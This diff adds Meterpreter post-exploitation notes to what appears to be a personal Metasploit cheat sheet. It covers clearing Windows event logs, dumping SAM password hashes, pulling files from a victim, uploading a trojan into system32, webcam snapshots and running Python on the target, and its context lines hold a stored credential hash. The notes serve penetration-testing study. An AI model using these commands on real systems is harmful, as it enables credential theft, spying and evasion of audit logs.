@@ -54,3 +54,74 @@ too many to list all of them here
 22. `msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::`  ex.
 23. `msf > loot -h`  
 24. `msf  exploit(usermap_script) > exploit`  how one would populate the db with some 'loot'  
+
+## Meterpreter  is the shell you get back on a victims computer.  Its a live session.    
+### basic commands  
+1. `meterpreter > help`  
+2. `meterpreter > background`  sends session to background and u back to msf cmd prompt  
+```
+msf exploit(ms08_067_netapi) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter >
+```
+3. `cat`  same as always.  
+4. `cd` and `pwd`   navigate victims computer  
+```
+meterpreter > pwd
+c:\
+meterpreter > cd c:\windows
+meterpreter > pwd
+c:\windows
+meterpreter >
+```  
+5. `clearev`  clears the Application, System and Security logs on a Window systems.  
+6. `download`   downloads a file from the remote machine  
+```
+meterpreter > download c:\\boot.ini
+[*] downloading: c:\boot.ini -> c:\boot.ini
+[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
+meterpreter >
+```
+7. `edit`  opens a file located on the target host. ex `meterpreter > edit edit.txt`  
+8. `execute`  runs a command on the target  `meterpreter > execute -f cmd.exe -i -H`  
+9. `getuid`  displays user that the meterpreter is using on host  
+10. `hashdump`  post module will dump the contents of the SAM database `meterpreter > run post/windows/gather/hashdump`  
+11. `idletime`  display the number of seconds that the user at the remote machine has been idle.  
+12. `ipconfig` displays the network interfaces and addresses on the remote machine.  
+13. `lpwd` and `lcd`  used to display and change the local working directory respectively  `lpwd` is where you are on your machine `lcd` is how you move around the file system  
+14. `ls` lists all files in current dir on victim machine.  
+15. `migrate` you can migrate to another process on the victim `meterpreter > run post/windows/manage/migrate`  
+16. `ps` displays a list of running processes on the target.  
+17.  `resource`  executes meterpreter instructions located inside a text file `resource readfile.txt`  
+18. `search`  provides a way of finding files on victim computer. `search -f autoexec.bat`  
+19. `shell`  will give you a standard shell on victim computer  
+20. `upload`  make note of double-slashes `meterpreter > upload evil_trojan.exe c:\\windows\\system32`  
+21. `webcam_list` display currently available web cams on vc  
+22. `webcam_snap`  grabs a picture from a connected web cam `meterpreter > webcam_snap -i 1 -v false`  
+
+### Python Extension  
+`meterpreter > load python`  - `help`  
+##### some python examples  
+`meterpreter > python_execute "print 'Good morning! It\\'s 5am'"`  
+You can also save to a variable, and print its content using the “-r” switch.  
+```
+meterpreter > python_execute "import os; cd = os.getcwd()" -r cd
+[+] cd = C:\Users\loneferret\Downloads
+meterpreter >
+```
+```
+root@kali:~# cat findfiles.py 
+import os
+for root, dirs, files in os.walk("c://"):
+    for file in files:
+        if file.endswith(".txt") and file.startswith("readme"):
+             print(os.path.join(root, file))
+```
+`meterpreter > python_import -f /root/findfiles.py`  
+
+
+
+
+
+ 
